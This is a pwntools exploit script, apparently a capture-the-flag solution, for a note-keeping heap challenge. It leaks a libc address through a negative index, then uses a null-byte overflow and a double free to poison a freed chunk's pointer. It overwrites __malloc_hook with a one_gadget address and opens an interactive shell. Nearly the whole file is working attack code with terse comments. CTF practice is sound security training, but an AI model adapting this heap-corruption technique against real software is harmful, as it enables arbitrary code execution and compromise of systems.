from pwn import *

target = process('./chall')

pid = gdb.attach(target, "\nb *add_note+250\nb *remove_note+102\nb *view_note+179\ncontinue")
#target = remote('pwn.chal.ctf.gdgalgiers.com', 1405)


def add_note(size, content):
	print(target.recvuntil(b'Enter an option:'))
	target.sendline(b'1')
	print(target.recvuntil(b'Size:'))
	target.sendline(str(size))
	print(target.recvuntil(b'Note content:'))
	target.send(content)
	
def remove_note(index):
	print(target.recvuntil(b'Enter an option:'))
	target.sendline(b'2')
	print(target.recvuntil(b'index:'))
	target.sendline(str(index))

def view_note(index):
	print(target.recvuntil(b'Enter an option:'))
	target.sendline(b'4')
	print(target.recvuntil(b'Index:'))
	target.sendline(str(index))

libc = ELF('libc.so.6')
#Get my libc leak
view_note(-17)
print(target.recvuntil(b'located at: '))
leak = target.recv(14)
atoi = int(leak, 16)
print(hex(atoi))
libc_base = atoi - libc.symbols['atoi']
malloc_hook = libc_base + libc.symbols['__malloc_hook']
print(hex(malloc_hook))
onegadget = libc_base + 0xe21d1


add_note(0xf8, b'a' * 8)
add_note(0x108, b'b' * 8)

remove_note(0)
remove_note(1)
#Getting my null-byte overflow
add_note(0xf8, b'a' * (0xf8-1))
#Here's the double free
remove_note(1) 
#Overwrite forward pointer of the 0x110 bin with malloc hook
add_note(0xf8, p64(malloc_hook))
#Placeholder
add_note(0x108, b'a')
#Let's me allocate another chunk
remove_note(3)
#Allocates over the malloc hook
add_note(0x108, p64(onegadget)) 
#Let's me allocate again
remove_note(3)

#Trigger the malloc and onegadget.
print(target.recvuntil(b'Enter an option:'))
target.sendline(b'1')
print(target.recvuntil(b'Size:'))
target.sendline(str(0x28))


target.interactive()